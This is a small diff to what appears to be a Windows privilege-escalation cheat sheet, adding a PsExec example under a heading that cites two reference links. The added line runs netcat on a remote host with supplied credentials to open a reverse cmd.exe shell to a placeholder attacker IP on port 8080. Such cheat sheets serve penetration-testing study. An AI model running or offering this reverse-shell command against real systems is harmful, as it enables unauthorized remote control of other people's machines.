@@ -844,6 +844,9 @@ net start <vulnerable-service>
 ```
 
 Psexec.exe:
+```vb
+$ PsExec -u tom -p iamtom \\TOMSCOMP C:\path\to\nc.exe IP_OF_ATTACKING_SYSTEM 8080 -e C:\windows\system32\cmd.exe
+```
 * https://pinkysplanet.net/escalating-privileges-in-windows-with-psexec-and-netcat/
 * https://www.robvanderwoude.com/ntadmincommands.php#Cmd15
 
